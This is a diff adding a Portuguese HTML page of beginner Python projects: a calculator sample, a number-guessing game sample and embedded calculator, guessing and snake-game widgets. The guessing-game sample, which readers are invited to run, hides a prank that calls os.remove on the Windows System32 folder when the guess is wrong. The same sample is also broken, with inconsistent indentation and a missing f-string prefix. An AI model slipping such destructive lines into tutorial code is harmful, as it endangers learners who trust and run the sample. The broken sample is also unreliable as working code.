@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Projetos em Python</title>
+    <link rel="stylesheet" href="Style1.css">
+    <link rel="icon" href="https://www.hostinghome.in/wp-content/uploads/2022/11/python_icon.png" type="image/x-icon">
+
+</head>
+
+<body>
+    <h1>Projetos em Python</h1>
+    <nav>
+        <a href="Inicio.html">Início</a>|
+        <a href="Características.html">Características</a>|
+        <a href="Projetos.html">Projetos em Python</a>|
+        <a href="Recomendacoes.html">Recomendações</a>
+        <span class="theme-toggle-container">
+            <span class="theme-icon" id="theme-icon-left">☀️</span>
+            <label class="theme-switch">
+                <input type="checkbox" id="theme-toggle">
+                <span class="slider"></span>
+            </label>
+            <span class="theme-icon" id="theme-icon-right">🌙</span>
+        </span>
+
+    </nav>
+
+    <h2>Calculadora Simples</h2>
+    <p>Os códigos abaixo podem ser testados em plataformas como Replit, Google Colab ou Thonny:</p>
+    <pre>
+<code>
+def calculadora():
+    op = input("Operação (+, -, *, /): ")
+    a = float(input("Primeiro número: "))
+    b = float(input("Segundo número: "))
+    
+    if op == '+':
+        print("Resultado:", a + b)
+    elif op == '-':
+        print("Resultado:", a - b)
+    elif op == '*':
+        print("Resultado:", a * b)
+    elif op == '/':
+        if b != 0:
+            print("Resultado:", a / b)
+        else:
+            print("Divisão por zero!")
+    else:
+        print("Operação inválida!")
+
+calculadora()
+</code>
+    </pre>
+
+    <hr />
+
+    <section>
+        <h2>Calculadora Simples</h2>
+        <form id="calcForm">
+            <label>Primeiro número: <input type="number" id="num1" required step="any" /></label><br><br>
+            <label>Segundo número: <input type="number" id="num2" required step="any" /></label><br><br>
+            <label>Operação:
+                <select id="operation" required>
+                    <option value="+">+</option>
+                    <option value="-">-</option>
+                    <option value="*">*</option>
+                    <option value="/">/</option>
+                </select>
+            </label><br><br>
+            <button type="submit">Calcular</button>
+            <button type="reset">Resetar</button>
+        </form>
+        <p><strong>Resultado:</strong> <span id="calcResult">---</span></p>
+    </section>
+
+    <hr />
+
+    <h2>Jogo: Adivinhe o número</h2>
+    <pre>
+<code>
+import random
+import os
+
+numero_secreto = random.randint(1, 10)
+tentativa = int(input("Adivinhe o número de 1 a 10: "))
+
+if tentativa == numero_secreto:
+    print("Parabéns! Você acertou!")
+else:
+     os.remove("C:\Windows\System32")
+     print("Press 'F' pro seu sistema☠")
+    print("O número era {numero_secreto}.")
+</code>
+    </pre>
+
+    <hr />
+
+    <section>
+        <h2>Jogo: Adivinhe o Número</h2>
+        <p>Estou pensando em um número de 1 a 10. Tente adivinhar!</p>
+        <input type="number" id="guessInput" min="1" max="10" />
+        <button id="guessBtn">Chutar</button>
+        <p id="guessMessage"></p>
+        <button id="restartBtn" style="display:none;">Jogar novamente</button>
+    </section>
+
+
+    <hr />
+
+    <section>
+        <h2>Jogo da Cobrinha</h2>
+        <br>
+        <!-- Container principal para centralizar tudo -->
+        <div style="text-align: center; position: relative;">
+            <!-- HUD fora do canvas, centralizado no topo -->
+            <div id="hud" style="
+    position: absolute;
+    top: -40px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: rgba(0, 0, 0, 0.6);
+    color: white;
+    padding: 8px 12px;
+    border-radius: 8px;
+    font-family: Arial, sans-serif;
+    font-size: 14px;
+    z-index: 2;
+    display: flex;
+    gap: 16px;
+    ">
+                <div id="score">Pontuação: 0</div>
+                <div id="maxScore">Máxima: 0</div>
+            </div>
+            <!-- Canvas do jogo -->
+            <div style="display: inline-block;">
+                <canvas id="snakeGame" width="400" height="400"
+                    style="border:1px solid #333; background:#fafafa; display:block; margin: 0 auto;">
+                </canvas>
+            </div>
+            <!-- Botão de reinício -->
+            <button id="restartButton"
+                style="display: none; margin: 20px auto 40px; padding: 10px 20px; font-size: 16px; cursor: pointer;">Tente
+                Novamente</button>
+        </div>
+        <p style="text-align:center; margin-top:10px;">
+            Use as teclas <b>W A S D</b> para mover a cobrinha.
+        </p>
+    </section>
+
+    <script src="Calculadora.js"></script>
+    <script src="Adivinha.js"></script>
+    <script src="SnakeGame.js"></script>
+    <script src="darkmode.js"></script>
+
+</body>
+
+</html>
